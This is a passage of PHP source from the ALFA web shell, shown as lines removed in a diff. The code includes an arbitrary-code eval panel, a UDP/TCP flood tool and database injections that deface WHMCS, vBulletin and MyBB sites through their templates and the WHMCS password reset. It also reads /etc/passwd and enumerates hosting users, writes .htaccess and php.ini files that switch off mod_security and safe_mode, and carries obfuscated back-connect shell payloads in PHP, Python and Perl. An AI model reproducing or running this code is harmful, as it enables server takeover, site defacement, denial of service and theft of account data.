-echo '<div class=header><Center><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form class="php-evals" name="pf" method="post" onsubmit="var ace_value=geEvalAceValue(this);g(\'phpeval\',null,ace_value,null,this.language.value); return false;"><div class="txtfont">Select Language: </div> <select name="language" style="width:300px;">'.$lang_html.'</select>'._alfa_load_ace_options("eval").'<br><br><div class="bigarea" style="position:relative;"><div class="php-evals-ace">'.(!empty($_POST['alfa1'])?htmlspecialchars($_POST['alfa1']):"&lt;?php\n\n\techo('hello alfa !');\n\n?>").'</div></div><center><input type="submit" value="" style="margin-top:5px"></center>';
-echo '</form><pre id="PhpOutput" style="'.(empty($_POST['alfa1'])?'display:none;':'').'margin-top:5px;" class="ml1">';
-if(!empty($_POST['alfa1'])){
-if($_POST['alfa3']=="php"){
-ob_start();
-eval('?>'.$_POST['alfa1']);
-$result = htmlspecialchars(ob_get_clean());
-}elseif(_alfa_can_runCommand()&&$GLOBALS["sys"]=="unix"){
-	$lang = $_POST['alfa3'];
-	$filename = "temp".rand(11111,99999);
-	$temp = $tempdir."/".$filename ;
-	__write_file($filename, $_POST['alfa1']);
-	$result = alfaEx("mv {$filename} {$temp};{$lang} {$temp};rm -f {$temp}");
-	@unlink($filename);
-	@unlink($temp);
-}
-echo '<textarea class="bigarea">'.$result.'</textarea>';
-}
-echo '</pre></div>';
-alfafooter();
-}
-function alfahash(){
-if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
-if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
-$stringTools = array(
-'Base64_encode ( $string )' => '__ZW5jb2Rlcg($s)',
-'Base64_decode ( $string )' => '__ZGVjb2Rlcg($s)',
-'strrev ( $string )' => 'strrev($s)',
-'bin2hex ( $string )' => 'bin2hex($s)',
-'hex2bin ( $string )' => 'hex2bin($s)',
-'md5 ( $string )' => 'md5($s)',
-'sha1 ( $string )' => 'sha1($s)',
-'hash ( "sha251", $string ) --> sha251' => 'hash("sha256",$s)',
-'hash ( "sha384", $string ) --> sha384' => 'hash("sha384",$s)',
-'hash ( "sha512", $string ) --> sha512' => 'hash("sha512",$s)',
-'crypt ( $string )' => 'crypt($s)',
-'crc32 ( $string )' => 'crc32($s)',
-'str_rot13 ( $string )' => 'str_rot13($s)',
-'urlencode ( $string )' => 'urlencode($s)',
-'urldecode  ( $string )' => 'urldecode($s)',
-'full_urlencode  ( $string )' => 'full_urlencode($s)',
-'htmlspecialchars  ( $string )' => 'htmlspecialchars($s)',
-'base64_encode (gzdeflate( $string , 9)) --> Encode' => '__ZW5jb2Rlcg(gzdeflate($s, 9))',
-'gzinflate (base64_decode( $string )) --> Decode' => '@gzinflate(__ZGVjb2Rlcg($s))',
-'str_rot13 (base64_encode( $string )) --> Encode' => 'str_rot13(__ZW5jb2Rlcg($s))',
-'base64_decode (str_rot13( $string )) --> Decode' => '__ZGVjb2Rlcg(str_rot13($s))',
-'str_rot13 (base64_encode(gzdeflate( $string , 9))) --> Encode' => 'str_rot13(__ZW5jb2Rlcg(gzdeflate($s,9)))',
-'gzinflate (base64_decode(str_rot13( $string ))) --> Decode' => '@gzinflate(__ZGVjb2Rlcg(str_rot13($s)))',
-);
-alfahead();
-echo '<div class=header>';
-echo "<form onSubmit='g(\"hash\",null,this.selectTool.value,this.input.value);return false;'><div class='txtfont'>Method:</div> <select name='selectTool' style='width:400px;'>";
-foreach($stringTools as $k => $v)
-echo "<option value='".htmlspecialchars($v)."' ".($_POST['alfa1']==$v?'selected':'').">".$k."</option>";
-echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['alfa1'])?'':htmlspecialchars(@$_POST['alfa2']))."</textarea></form>";
-if(!empty($_POST['alfa1'])){
-$string = addslashes($_POST['alfa2']);
-$string = str_replace('\"','"',$string);
-$alg = $_POST['alfa1'];
-$code = str_replace('$s',"'".$string."'",$alg);
-ob_start();
-eval('echo '.$code.';');
-$res = ob_get_contents();
-ob_end_clean();
-if(in_array($alg, $stringTools))echo '<textarea class="bigarea">'.htmlspecialchars($res).'</textarea>';
-}
-echo "</div>";
-alfaFooter();
-}
-function alfados(){
-alfahead();
-echo '<div class=header>';
-echo '<center><p><div class="txtfont_header">| DOS |</div></p><form onSubmit="g(\'dos\',null,this.host.value,this.time.value,this.port.value,this.m.value); return false;"><div class="txtfont">Method : <select name="m" style="width:80px;"><option value="udp">UDP</option><option value="tcp">TCP</option></select> Host : <input name="host" type="text" value="localhost" size="25" /> Time : <input name="time" type="text" size="15" /> Port : <input name="port" type="text" size="10" /> <input type="submit" value=" " /></div></form></center><br>';
-if(!empty($_POST['alfa1']) && !empty($_POST['alfa2']) && !empty($_POST['alfa3'])){
-echo __pre();
-$packets=0;
-ignore_user_abort(true);
-$exec_time=(int)$_POST['alfa2'];
-$time=time();
-$max_time=$exec_time+$time;
-$host=$_POST['alfa1'];
-$port=(int)$_POST['alfa3'];
-$method=$_POST['alfa4'];
-$out = str_repeat('X',65000);
-while(1){
-$packets++;
-if(time() > $max_time){
-break;
-}
-$fp = @fsockopen($method.'://'.$host, $port, $errno, $errstr, 5);
-if($fp){
-fwrite($fp, $out);
-fclose($fp);
-}
-}
-echo "<center>$packets (" . @round(($packets*65)/1024, 2) . " MB) packets averaging ". @round($packets/$exec_time, 2) . " packets per second</center>";
-echo "</pre>";
-}
-echo '</div>';
-alfafooter();
-}
-function __pre(){return('<pre id="strOutput" style="margin-top:5px" class="ml1">');}
-function alfaIndexChanger(){
-alfahead();
-
-echo '<div class=header><center><p><div class="txtfont_header">| Index Changer |</div></p><h3><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,null,\'whmcs\')">| Whmcs | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,\'vb\',null)">| vBulletin | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,\'mybb\')">| MyBB | </a></h3></center>';
-if(isset($_POST['alfa3'])&&($_POST['alfa3'] == 'whmcs')){
-echo __pre();
-
-echo "<center><center><div class='txtfont_header'>| Whmcs |</div>
-<p><center>".getConfigHtml('whmcs')."<form onSubmit=\"g('IndexChanger',null,null,null,'whmcs',this.fname.value,this.path.value,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value); return false;\">
-";
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'File Name', 'inputName' => 'fname', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
- 'td6' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
-);
-create_table($table);
-echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=index rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
-<input type='submit' value=' '>
-</form></center></center>";
-if(isset($_POST['alfa6'])){
-$s0levisible="Powered By Solevisible";
-$dbu = $_POST['alfa6'];
-$path = $_POST['alfa5'];
-$fname = $_POST['alfa4'];
-$dbn = $_POST['alfa7'];
-$dbp = $_POST['alfa8'];
-$dbh = $_POST['alfa9'];
-$index = $_POST['alfa10'];
-$index = str_replace("\'","'",$index);
-$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $solevisible = fopen("'.$fname.'","w"); fwrite($solevisible,$x);';
-$saveData = __ZW5jb2Rlcg($deface);
-$Def = '{php}eval(base64_decode("'.$saveData.'"));{/php}';
-if(!empty($dbh)&&!empty($dbu)&&!empty($dbn)&&!empty($index)){
-$conn=@mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
-$soleSave=@mysqli_query($conn,"select message from tblemailtemplates where name='Password Reset Validation'");
-$soleGet = mysqli_fetch_assoc($soleSave);
-$tempSave1 = $soleGet['message'];
-$tempSave = str_replace("'","\'",$tempSave1);
-$inject = "UPDATE tblemailtemplates SET message='$Def' WHERE name='Password Reset Validation'";
-$result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
-$result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
-if(function_exists('curl_version')){
-$AlfaSole = new AlfaCURL(true);
-$saveurl = $AlfaSole->Send($path."/pwreset.php");
-$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
-$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
-$Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
-__alert('File Created...');
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$path."/".$fname."'>Click Here !</a></font></b></center><br><br>";
-}else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
-}}}}
-if(isset($_POST['alfa1']) && ($_POST['alfa1'] == 'vb')){
-echo __pre();
-
-echo "<center><center><div class='txtfont_header'>| vBulletin |</div>
-<p><center>".getConfigHtml('vb')."<form onSubmit=\"g('IndexChanger',null,'vb',this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value,this.prefix.value,'>>'); return false;\">
-";
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'Prefix', 'inputName' => 'prefix', 'id' => 'db_prefix', 'inputValue' => '', 'inputSize' => '50')
-);
-create_table($table);
-echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
-<input type='submit' value=' '></form></center></center>";
-if($_POST['alfa8']=='>>'){
-$s0levisible="Powered By Solevisible";
-$dbu = $_POST['alfa2'];
-$dbn = $_POST['alfa3'];
-$dbp = $_POST['alfa4'];
-$dbh = $_POST['alfa5'];
-$index = $_POST['alfa6'];
-$prefix = $_POST['alfa7'];
-$index=str_replace("\'","'",$index);
-$set_index = "{\${eval(base64_decode(\'";
-$set_index .= __ZW5jb2Rlcg("echo \"$index\";");
-$set_index .= "\'))}}{\${exit()}}";
-if(!empty($dbh)&&!empty($dbu)&&!empty($dbn)&&!empty($index)){
-$conn=@mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
-$loli1 = "UPDATE ".$prefix."template SET template='".$set_index."".$s0levisible."' WHERE title='spacer_open'";
-$loli2 = "UPDATE ".$prefix."template SET template='".$set_index."".$s0levisible."' WHERE title='FORUMHOME'";
-$loli3 = "UPDATE ".$prefix."style SET css='".$set_index."".$s0levisible."', stylevars='', csscolors='', editorstyles=''";
-@mysqli_query($conn,$loli1) or die (mysqli_error($conn));
-@mysqli_query($conn,$loli2) or die (mysqli_error($conn));
-@mysqli_query($conn,$loli3) or die (mysqli_error($conn));
-__alert('VB index changed...!');
-}
-}
-}
-if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'mybb')) {
-echo __pre();
-
-echo "<center><center><div class='txtfont_header'>| Mybb |</div>
-<p><center>".getConfigHtml('mybb')."<form onSubmit=\"g('IndexChanger',null,'null','mybb',null,null,null,this.mybbdbh.value,this.mybbdbu.value,this.mybbdbn.value,this.mybbdbp.value,this.mybbindex.value); return false;\" method=POST action=''>
-";
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'mybbdbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'mybbdbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'mybbdbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'mybbdbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
-);
-create_table($table);
-echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=mybbindex rows='19' cols='103'>
-<title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
-if(isset($_POST['alfa6'])){
-$mybb_dbh = $_POST['alfa6'];
-$mybb_dbu = $_POST['alfa7'];
-$mybb_dbn = $_POST['alfa8'];
-$mybb_dbp = $_POST['alfa9'];
-$mybb_index = $_POST['alfa10'];
-if(!empty($mybb_dbh)&&!empty($mybb_dbu)&&!empty($mybb_dbn)&&!empty($mybb_index)){
-$conn=@mysqli_connect($mybb_dbh,$mybb_dbu,$mybb_dbp,$mybb_dbn) or die(mysqli_error($conn));
-$prefix="mybb_";
-$loli7 = "UPDATE ".$prefix."templates SET template='".$mybb_index."' WHERE title='index'";
-$result =@mysqli_query($conn,$loli7) or die (mysqli_error($conn));
-__alert('MyBB index changed...!');
-}
-}
-}
-echo "</div>";
-alfafooter();
-}
-function alfaproc()
-{
-alfahead();
-echo "<Div class=header><br><center>";
-if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
-$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
-if($GLOBALS['sys']=="win"){
-$process=array(
-"Task List" =>"tasklist /V",
-"System Info" =>"systeminfo",
-"Active Connections" => "netstat -an",
-"Running Services" => "net start",
-"User Accounts" => "net user",
-"Show Computers" => "net view",
-"ARP Table" => "arp -a",
-"IP Configuration" => "ipconfig /all"
-);}else{
-$process=array(
-"Process status" => "ps aux",
-"Syslog" =>"cat /etc/syslog.conf",
-"Resolv" => "cat /etc/resolv.conf",
-"Hosts" =>"cat /etc/hosts",
-"Cpuinfo"=>"cat /proc/cpuinfo",
-"Version"=>"cat /proc/version",
-"Sbin"=>"ls -al /usr/sbin",
-"Interrupts"=>"cat /proc/interrupts",
-"lsattr"=>"lsattr -va",
-"Uptime"=>"uptime",
-"Fstab" =>"cat /etc/fstab"
-);}
-foreach($process as $n => $link){
-echo '<a href="javascript:void(0);" onclick="g(\'proc\',null,\''.$link.'\')"> | '.$n.' | </a>';
-}
-echo "</center><br>";
-if(!empty($_POST['alfa1'])){
-echo "<pre class='ml1' style='margin-top:5px' >";
-if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."';";}
-echo alfaEx($cmd.$_POST['alfa1'], true);
-echo '</pre>';
-}
-echo "</div>";
-alfafooter();
-}
-function alfasafe(){
-alfahead();
-echo "<div class=header><center><br><div class='txtfont_header'>| Auto ByPasser |</div>";
-echo '<h3><a href=javascript:void(0) onclick="g(\'safe\',null,\'php.ini\',null)">| PHP.INI | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,\'ini\')">| .htaccess(apache) | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,\'pl\')">| .htaccess(LiteSpeed) |</a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,\'passwd\')">| Read-Passwd | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,\'users\')">| Read-Users | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,\'valiases\')">| Get-User | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,null,null,\'domains\')">| Get-Domains | </a></center></h3>';
-if(!empty($_POST['alfa8']) && isset($_POST['alfa8']) == 'domains'){
-if(!_alfa_file_exists("/etc/virtual/domainowners")){
-echo __pre();
-$solevisible9 = _alfa_file('/etc/named.conf');
-if(is_array($solevisible9)){
-foreach($solevisible9 as $solevisible13){
-if(@eregi('zone',$solevisible13)){
-preg_match_all('#zone "(.*)"#',$solevisible13,$solevisible14);
-if(strlen(trim($solevisible14[1][0])) > 2){
-echo $solevisible14[1][0].'<br>';
-}}}
-}
-}else{
-echo __pre();
-$users = _alfa_file("/etc/virtual/domainowners");
-if(is_array($users)){
-foreach($users as $boz){
-$dom = explode(":",$boz);
-echo $dom[0]."\n";}}}}
-if(!empty($_POST['alfa6']) && isset($_POST['alfa6']) == 'valiases'){
-echo '
-<form onsubmit="g(\'safe\',null,null,null,null,null,null,\'valiases\',this.site.value,null,\'>>\'); return false;" method="post" /><center><div class="txtfont">Url: </font><input type="text" placeholder="site.com" name="site" /> <input type="submit" value=" " name="go" /></form></center>';
-if(isset($_POST['alfa9']) && $_POST['alfa9'] == '>>'){
-if(!_alfa_file_exists("/etc/virtual/domainowners")){
-$site = trim($_POST['alfa7']);
-$rep = str_replace(array("https://","http://","www."),"",$site);
-$user = "";
-if(function_exists("posix_getpwuid") && function_exists("fileowner")){
-	if($user = @posix_getpwuid(@fileowner("/etc/valiases/{$rep}"))){
-		$user = $user['name'];
-	}
-}else{
-	if(_alfa_can_runCommand(true,true)){
-		$user = alfaEx("stat -c '%U' /etc/valiases/".$rep);
-	}
-}
-if(!empty($user)&&$user!='root'){
-echo __pre()."<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">{$user}</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";
-}else {echo __pre().'<center><b>No such file or directory Or Disable Functions is not NONE...</b></center>';}
-}else{
-$site = trim($_POST['alfa7']);
-$rep = str_replace(array("https://","http://","www."),"",$site);
-$users = _alfa_file("/etc/virtual/domainowners");
-foreach($users as $boz){
-$ex = explode(":",$boz);
-if($ex[0] == $rep){
-echo __pre()."<center><table border='1'>
-<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">".trim($ex[1])."</font></b></td></tr>
-<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
-if(!empty($_POST['alfa5']) && isset($_POST['alfa5'])){
-if(!_alfa_file_exists("/etc/virtual/domainowners")){
-echo __pre();
-$i = 0;
-while ($i < 60000) {
-$line = @posix_getpwuid($i);
-if (!empty($line)) {
-while (list ($key, $vl) = each($line)){
-echo $vl."\n";
-break;}}$i++;}
-}else{echo __pre();
-$users = _alfa_file("/etc/virtual/domainowners");
-foreach($users as $boz){
-$user = explode(":",$boz);
-echo trim($user[1]).'<br>';}}}
-if(!empty($_POST['alfa4']) && isset($_POST['alfa4'])){
-echo __pre();
-if(_alfa_can_runCommand(true,true)){echo __read_file("/etc/passwd");}elseif(function_exists("posix_getpwuid")){
-for($uid=0;$uid<60000;$uid++){
-$ara = @posix_getpwuid($uid);
-if(!empty($ara)){
-while(list ($key, $val) = each($ara)){
-echo "$val:";
-}echo "\n";}}
-}else{__alert('failed...');}}
-if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
-@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Sole Sad and Invisible\n<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
-echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
-}
-if(!empty($_POST['alfa1'])&& isset($_POST['alfa1'])){
-@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Sole Sad & Invisible(ALFA TEaM)");
-echo '<center><b><big> php.ini created...!</center></b></big>';
-}
-if(!empty($_POST['alfa3']) && isset($_POST['alfa3'])){
-@__write_file($GLOBALS['cwd'].".htaccess","#Generated By Sole Sad and Invisible\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
-echo '<center><b><big>htaccess for Litespeed created...!</center></b></big>';
-}
-echo "<br></div>";
-alfafooter();
-}
-function __get_resource($content){
-return @gzinflate(__ZGVjb2Rlcg($content));
-}
-function __write_file($file, $content){
-if($fh = @fopen($file, "wb")){
-if(fwrite($fh, $content)!==false) return true;
-}
-return false;
-}
-function bcinit($evalType, $evalCode, $evalOptions, $evalArguments){
-$res = "<font color='green'>[ Success...! ]</font>";
-$err = "<font color='red'>[ Failed...! ]</font>";
-if($evalOptions!="") $evalOptions = $evalOptions." ";
-if($evalArguments!="") $evalArguments = " ".$evalArguments;
-if($evalType=="c"){
-$tmpdir = ALFA_TEMPDIR;
-chdir($tmpdir);
-if(is_writable($tmpdir)){
-$uniq = substr(md5(time()),0,8);
-$filename = $evalType.$uniq.".c";
-$path = $filename;
-if(__write_file($path, $evalCode)){
-$ext = ($GLOBALS['sys']=='win')? ".exe":".out";
-$pathres = $filename.$ext;
-$evalOptions = "-o ".$pathres." ".$evalOptions;
-$cmd = "gcc ".$evalOptions.$path;
-alfaEx($cmd);
-if(is_file($pathres)){
-if(chmod($pathres, 0755)){
-$cmd = $pathres.$evalArguments;
-alfaEx($cmd);
-}else{$res = $err;}
-unlink($pathres);
-}else{$res = $err;}
-unlink($path);
-}else{$res = $err;}
-}
-return $res;
-}elseif($evalType=="java"){
-$tmpdir = ALFA_TEMPDIR;
-chdir($tmpdir);
-if(is_writable($tmpdir)){
-if(preg_match("/class\ ([^{]+){/i",$evalCode, $r)){
-$classname = trim($r[1]);
-$filename = $classname;
-}else{
-$uniq = substr(md5(time()),0,8);
-$filename = $evalType.$uniq;
-$evalCode = "class ".$filename." { ".$evalCode . " } ";
-}
-$path = $filename.".java";
-if(__write_file($path, $evalCode)){
-$cmd = "javac ".$evalOptions.$path;
-alfaEx($cmd);
-$pathres = $filename.".class";
-if(is_file($pathres)){
-if(chmod($pathres, 0755)){
-$cmd = "java ".$filename.$evalArguments;
-alfaEx($cmd);
-}else{$res = $err;}
-unlink($pathres);
-}else{$res = $err;}
-unlink($path);
-}else{$res = $err;}
-}
-return $res;
-}
-return false;
-}
-function alfaconnect(){
-alfahead();
-$php="7VZta9swEP5e6H9QjaE2S5uXfhg0pDBYPw7KVtiHtjOOLNcitqVJ8pKxpb99d36L4zid17WwQV1wrbvTo0e6Oz1hSgnlKSaFMjy9d0bu9PBAM+MZnjAv5gk3hU3MPZ7ImFNuvDDOdOSg1Ta+umdGkxlhKxmLgDkWsQaktOchFL3js7O3OFj6MEizOMYBaw50BAMLUIAJub78+GG2Mkwl06tP49nxrX31+f3F8bR0g206nPN0CJNOuIXTE5z9QN7FoU+umZ8QHbE4Jg/k8AD9PCQOFVlqnIqyS2ZAyyU/Dg8IPLYEgNI3LU05I6saGRzBogFa1oTFmu1BnXSi6pvRXRO5No/vtpfw6SJfomAdZik1XKQeW3FttHMsaWpiLxRqcew2FuIBTN748vSgBzEK74yc4IYBxzjjtru0j5p2KTRfeVANmgeO2wFQUkTe1dlsGGHatVGQC08LuoCa0kx9Y8qxDJXnw+HoNP87t8gp0IeaYUqlovgP8yoiFURZkyKDw9YDclYztenOQj6lTGJcczcQYkQslsBAZ3MYOTKSXpb6CXPcARkBpptv0lrydLMPfMKl4oY5NgV2CdCFtNElHskpsS6sahF8lhGPGZ4oOQKk0Ici2UKqiyLE1ANic3J97orde4lvaORYQxrcEufmy62+e+MOOfYWnpVS7g5ujh1gGYB7U1VtdK69gCsHIgGCRtV3R7QtAGt7r62oTRsYxZPmEduyPEysFov8/En2RnzNIMIlc8jgooWP6AUNHxr7coWTkIi1k4TWxGbGRHNv60ZWaSw0a+WgMtalU2xxbzU059oB1ryvlP/dGZHZRflpSS4ZJM5SFtTZuMOxRMek27G1gFTY5EpQT0iWAstogKtiUXDZjMSUHEGmFdMiUxTYSqyY7d7Hp9Fe8xi6B0UAweCygp7oFTnuHTnpFUlbQWVPGZXt9lJ+QzIRYhaxyIrvgpXbXVO28uss5Tms9lBSbHdCzTFmFO4U5UPkEl8MXqheXS3MU6+xgvL3dCvHmwDggyKO6q42rOqtyorN21HrxwjU2+vDog5+nAp9EovJn7CY/D2Ljl7XXb3eeQEUp73PM97r2S6gvFcrb61p6+YPiEo9Ufa31TNEOSsaPSrvfZbia0v/nknb9LNr207uXrWtib9P2+AHa1910z3UrYeQ6VchexEh008SMv0kIdMvLmS65+Wt/ych0/+EkP2ORV8he2nN+gU=";
-$python="pVRtT9swEP6cSv0PxptWR80M7YY0wYJUQZjQBlRtp30AVqXOpYmWOpHtQPnCb5/tJG1AHUKaqra+V99z95zf7e2XUuwvUr4P/B4VjyrJebeTropcKCTAk+WiEDkDKb1cevJRf3P2B5Sn0hV0O4WPcbeT2N8IYiQTyDLC3KNuxzFx/jaejvMCOGGe9fFnotTZVZSX6pnTxTgwahBilzrlL7WuvkmAKgVHRk2rlFRAGBG336h0upZqVSjiUuAsj4D0ShV//NLTeSoIIVNpzmsMaYxySXm4gj0fc4WNzol9RuM0A54Tc7ujPXRjFKwIhrVt3CyYXPprBWJ1PJ4O/N778a+zk95xbdWqY9tymaCPKfr6AfelEiR2+xidtIXhVjIXQSbBFvCQ6NuR6aAVHSUeq4MjdGkC2D0ZHAw/uzQCCxFbiNgW68CaQaFq/yKUstI2uR2DWWMjwj05qDXOwhdAJYSCJQSz6BaRm9+38q7vYk94cRYupXG4+HZ1PQlOR9PAreN0qkWTo+5lEaqEpjJKBVnQpcjLggxcd+NkmsmSF9bGqEcJPCL/mmDj18Ki8xl+WVYKt11JqVDII4tUnw3WOruRKkebB9XkOg+11HCkqeBoSz58y3FfF78ExR4Mz/CJ3omlr5lBQ7G810tV9XXp+v7Q7oe/vBncdTuQtSyf2hYn0YehddGVwDpVuhtm6VKuSKFP0q+2kVZ/pJZG5/OLq2BWryqdXp9+n09nk2B0aWI0TGUsebEJmF7/mBuvdsx8EvycBqOzs4lnLn1ZvaSawREh+IDaD/YKOwBJs1TvAieHRjLM1Csfur7uAjPEsyvT4qB5R6jMAAqLbTu8navXUIDgJzTK4hDNIFyhqZkvetIT2M2JLSFeC8ebp2F3ls3D8KwZdmAGJtLEzTkHpghJ6mbsxnn4Bpzy/3C+Fv5GnNL9Cw==";
-$perl="lZLRjpNAFIav26TvMOJsC8kYWr1bpJFQ3DRrS8OwGmOVsPSsTKQDgVm3m+722Z0BVifGGL0755/Dd+Abnj+zb5vavmbcBv4dVVAXo+FtA2gZnp/TMvsGwhkNcdm4+EuoqiZ3DThUZS1QHEQr9yCg3jsbOnMnW7z5sNjOJ05/LkOnJTc5esEM+TS7MRXqtLfvZMysY4s788MV3QT+GbIvDedRLhHuVxBVXYry+p6nezAnIqsmliQ07SuZlIw3b5PlOojJmIb+ZULjKPBWBAvr4WHHwLS6bW+86OK9686s42g4wJWLVf9p+lmeDhoQilZWCkfDd4kCSSANkyi4ooG3WERkpkAD+RE7OaTG092uThg3cUWWazWSeOuPlrZ1ULBGAJfjr/Q0zTKQm3xCrW65JPrEOCGvuElRDOke0RyKAp223CDTdqisgCMaL5ZrYrwe+4bzFIRXMTHmehJEUZ/I5+AAGZJqtfVZUTZg+pbTFfRnoehaI8laJ6lWB2QCTWUlLweK5pfYl38Si/O+nXUtcxkHkaSilNpyXQpO3d+cYqafZyXnkKn7wamet/boP9gze3vzMTUs5ynp9elR709FfxP4f946W3BU+kz5Jz3+AA==";
